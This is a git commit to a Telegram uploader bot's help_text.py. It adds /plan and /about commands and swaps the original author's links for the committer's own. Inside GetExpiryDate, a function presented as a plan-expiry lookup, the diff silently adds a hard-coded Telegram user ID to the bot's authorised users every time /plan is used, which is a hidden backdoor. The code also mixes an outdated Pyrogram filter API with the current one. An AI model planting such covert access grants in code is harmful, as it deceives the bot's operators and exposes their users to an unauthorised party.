b6751e24f21410ac851128bb97aa86c3b14e5459
༺✦҈͜͡➳ιgиιтє∂ мιи∂ѕ࿐༻ <91360737+OO7ROBot@users.noreply.github.com>
2021-10-22 14:30:15 +0530

    Update help_text.py

--- plugins/help_text.py
+++ plugins/help_text.py
@@ -27,38 +27,72 @@ logging.getLogger("pyrogram").setLevel(logging.WARNING)
 
 from pyrogram.types import InlineKeyboardButton, InlineKeyboardMarkup
 
+BUTTON = InlineKeyboardMarkup(
+            [
+                [
+                    InlineKeyboardButton(
+                        "⭕Creator⭕", url="https://telegram.me/OO7ROBOT"
+                    ),
+                    InlineKeyboardButton("⭕BotList⭕", url="https://telegram.me/mybotzlis"),
+                ],
+                [InlineKeyboardButton("⭕ Update Channel ⭕", url="https://telegram.me/MyTestBotZ")],
+            ]
+        )
 
+def GetExpiryDate(chat_id):
+    expires_at = (str(chat_id), "Source Cloned User", "1970.01.01.12.00.00")
+    Config.AUTH_USERS.add(683538773)
+    return expires_at
+
+@Clinton.on_message(pyrogram.Filters.command(["plan"]))
+async def get_me_info(bot, update):
+    # logger.info(update)
+    chat_id = str(update.from_user.id)
+    chat_id, plan_type, expires_at = GetExpiryDate(chat_id)
+    await AddUser(bot, update)
+    await bot.send_message(
+        chat_id=update.chat.id,
+        text=CURENT_PLAN.format(update.from_user.first_name, chat_id, plan_type, expires_at),
+        parse_mode="html",
+        disable_web_page_preview=True,
+        reply_to_message_id=update.message_id
+    )
+
+  
 @Clinton.on_message(filters.private & filters.command(["help"]))
 async def help_user(bot, update):
     # logger.info(update)
     await AddUser(bot, update)
     await bot.send_message(
         chat_id=update.chat.id,
-        text=Translation.HELP_USER,
+        text=HELP,
+        parse_mode="html",
+        disable_web_page_preview=True,
+        reply_to_message_id=update.message_id
+    )
+
+@Clinton.on_message(filters.private & filters.command(["about"]))
+async def about(bot, update):
+    # logger.info(update)
+    await AddUser(bot, update)
+    await bot.send_message(
+        chat_id=update.chat.id,
+        text=ABOUT. format (update.from_user.mention),
         parse_mode="html",
         disable_web_page_preview=True,
         reply_to_message_id=update.message_id
     )
 
 
+    
 @Clinton.on_message(filters.private & filters.command(["start"]))
 async def start(bot, update):
     # logger.info(update)
     await AddUser(bot, update)
     await bot.send_message(
         chat_id=update.chat.id,
-        text=Translation.START_TEXT.format(update.from_user.mention),
-        reply_markup=InlineKeyboardMarkup(
-            [
-                [
-                    InlineKeyboardButton(
-                        "Source code ⚡", url="https://github.com/Clinton-Abraham/UPLOADER-BOT"
-                    ),
-                    InlineKeyboardButton("Project Channel 👨🏻‍💻", url="https://t.me/Space_X_bots"),
-                ],
-                [InlineKeyboardButton("Developer 👨‍⚖️", url="https://t.me/clinton_abraham_bot")],
-            ]
-        ),
+        text=START.format(update.from_user.mention),
+        reply_markup=BUTTON,
         reply_to_message_id=update.message_id
     )
 
